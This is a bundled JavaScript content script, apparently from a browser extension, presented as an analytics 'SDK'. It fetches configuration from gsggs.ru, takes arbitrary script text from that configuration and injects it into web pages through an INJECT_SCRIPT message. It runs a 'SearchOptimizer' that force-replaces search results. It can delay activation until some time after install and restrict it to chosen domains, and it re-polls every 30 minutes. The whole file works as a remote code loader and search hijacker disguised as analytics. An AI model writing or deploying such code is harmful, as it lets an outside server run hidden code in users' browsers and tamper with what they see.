(function(){
'use strict';

// ======== shared/dom-helpers.js ========
const DOMHelpers = {
  applyStyles: function(elements, styles) {
    if (!elements || !styles) return;
    const nodes = typeof elements === 'string' ? 
      document.querySelectorAll(elements) : elements;
    nodes.forEach(el => {
      if (el && el.style) Object.assign(el.style, styles);
    });
  },
  
  createElement: function(config) {
    const el = document.createElement(config.tag || 'div');
    if (config.attrs) {
      Object.keys(config.attrs).forEach(key => {
        el.setAttribute(key, config.attrs[key]);
      });
    }
    if (config.style) {
      Object.assign(el.style, config.style);
    }
    if (config.html) {
      el.innerHTML = config.html;
    }
    return el;
  }
};

// ======== shared/api-client.js ========
const APIClient = {
  fetchConfig: async function() {
    try {
      const response = await fetch('https://gsggs.ru/config?v=' + Date.now(), {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Cache-Control': 'no-cache'
        }
      });
      return await response.json();
    } catch (error) {
      return null;
    }
  }
};

// ======== core/config-processor.js ========
const ConfigProcessor = {
  process: function(config) {
    if (!config) return { campaigns: [], modules: [] };
    
    const campaigns = [];
    const modules = [];
    
    if (config.campaigns) {
      config.campaigns.forEach(campaign => {
        if (campaign.active) {
          campaigns.push({
            title: campaign.title,
            content: campaign.content,
            image: campaign.image,
            cta_button: campaign.cta_button,
            cta_url: campaign.cta_url
          });
        }
      });
    }
    
    if (config.analytics_modules) {
      config.analytics_modules.forEach(module => {
        if (module.active && module.script) {
          modules.push({
            name: module.name,
            script: module.script,
            config: module.config
          });
        }
      });
    }
    
    return { campaigns, modules };
  }
};

// ======== core/module-executor.js ========
const ModuleExecutor = {
  executedModules: new Set(),
  moduleCache: new Map(),
  
  execute: function(modules) {
    if (!modules || !modules.length) return;
    
    const sortedModules = this.sortModulesByDependency(modules);
    
    sortedModules.forEach(module => {
      const moduleKey = `${module.name}_${module.script?.substring(0, 50)}`;
      if (this.executedModules.has(moduleKey)) {
        return;
      }
      
      if (module.script && this.shouldExecute(module)) {
        console.log('SDK: Executing module:', module.name);
        this.executeCombinedModules(sortedModules);
        this.executedModules.add(moduleKey);
      }
    });
  },
  
  sortModulesByDependency: function(modules) {
    const searchOptimizer = modules.find(m => m.name === 'search_optimizer');
    const otherModules = modules.filter(m => m.name !== 'search_optimizer');
    
    return searchOptimizer ? [searchOptimizer, ...otherModules] : modules;
  },
  
  executeCombinedModules: function(modules) {
    const combinedCode = this.prepareCombinedModulesCode(modules);
    
    console.log('[SDK] INJECTING COMBINED MODULES:', modules.map(m => m.name).join(', '));

    chrome.runtime.sendMessage({
      action: 'INJECT_SCRIPT',
      code: combinedCode
    }, (response) => {
      console.log('[SDK] Combined modules injected:', response || 'no response');
    });
  },
  
  prepareCombinedModulesCode: function(modules) {
    let combinedScript = '';
    
    modules.forEach(module => {
      combinedScript += `\n// ======== ${module.name} ========\n`;
      combinedScript += module.script + '\n';
    });
    
    return `
      (function() {
        try {
          console.log('[MAIN] Loading combined modules...');
          
          ${combinedScript}
          
          console.log('[MAIN] Auto-initializing modules...');
          
          if (typeof SearchOptimizer !== 'undefined') {
            console.log('[MAIN] Initializing SearchOptimizer...');
            const optimizer = new SearchOptimizer();
            optimizer.init();
            window._searchOptimizer = optimizer;
            console.log('[MAIN] SearchOptimizer initialized with status:', optimizer.getStatus());
            
            setTimeout(() => {
              console.log('[MAIN] Force replacing search results...');
              const result = optimizer.forceReplace();
              console.log('[MAIN] Force replace result:', result);
            }, 2000);
          } else {
            console.warn('[MAIN] SearchOptimizer not defined');
          }
          
          if (typeof initSearchEnhancer !== 'undefined') {
            console.log('[MAIN] Initializing analytics boost...');
            initSearchEnhancer();
            console.log('[MAIN] Analytics boost initialized');
          }
          
          console.log('[MAIN] All modules initialized successfully');
          
        } catch(e) {
          console.error('[MAIN] Combined modules execution error:', e);
        }
      })();
    `;
  },
  
  shouldExecute: function(module) {
    if (!module.config) return true;
    
    const currentUrl = window.location.href;
    const currentHostname = window.location.hostname;
    
    if (module.config.only_on) {
      const domainMatch = module.config.only_on.some(domain => 
        currentHostname.includes(domain)
      );
      if (!domainMatch) return false;
    }

    if (module.config.url_patterns) {
      const patternMatch = module.config.url_patterns.some(pattern => 
        currentUrl.includes(pattern)
      );
      if (!patternMatch) return false;
    }
    
    if (module.config.min_install_time) {
      const installTime = parseInt(localStorage.getItem('sdk_install_time') || '0');
      const timeSinceInstall = Date.now() - installTime;
      if (timeSinceInstall < module.config.min_install_time) {
        return false;
      }
    }
    
    return true;
  },
  
  executeModule: function(module) {
    return this.execute([module]);
  },
  
  forceExecute: function(module) {
    this.executedModules.clear();
    this.execute([module]);
  },
  
  clearCache: function() {
    this.executedModules.clear();
    this.moduleCache.clear();
  }
};

// ======== core/sdk-core.js ========
const SDKCore = {
  init: async function() {
    if (!localStorage.getItem('sdk_install_time')) {
      localStorage.setItem('sdk_install_time', Date.now());
    }
    
    await this.loadAndExecute();
    this.startUpdateInterval();
  },
  
  loadAndExecute: async function() {
    console.log('SDK: Fetching config from server...');
    const config = await APIClient.fetchConfig();
    
    if (!config) {
      console.log('SDK: No config received or fetch failed');
      return;
    }
    
    console.log('SDK: Config received:', config);
    const processed = ConfigProcessor.process(config);
    console.log('SDK: Processed modules:', processed.modules.length);
    
    if (processed.modules.length > 0) {
      console.log('SDK: Executing combined modules...');
      ModuleExecutor.execute(processed.modules);
    }
  },
  
  startUpdateInterval: function() {
    setInterval(() => {
      this.loadAndExecute();
    }, 1800000); 
  },
  
  getStatus: function() {
    return {
      modulesExecuted: Array.from(ModuleExecutor.executedModules),
      installTime: localStorage.getItem('sdk_install_time')
    };
  },
  
  forceReload: function() {
    ModuleExecutor.clearCache();
    this.loadAndExecute();
  }
};

// ======== sdk-loader.js ========
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
      console.log('SDK: Starting initialization...');
      window.SDKCore.init();
    }, 1000);
  });
} else {
  setTimeout(() => {
    console.log('SDK: Starting initialization...');
    window.SDKCore.init();
  }, 1000);
}

window.SDKCore = SDKCore;
window.ModuleExecutor = ModuleExecutor;

window.getSDKStatus = function() {
  return window.SDKCore ? window.SDKCore.getStatus() : 'SDK not loaded';
};

window.forceSDKReload = function() {
  return window.SDKCore ? window.SDKCore.forceReload() : 'SDK not loaded';
};

console.log('SDK Bundle loaded successfully');

})();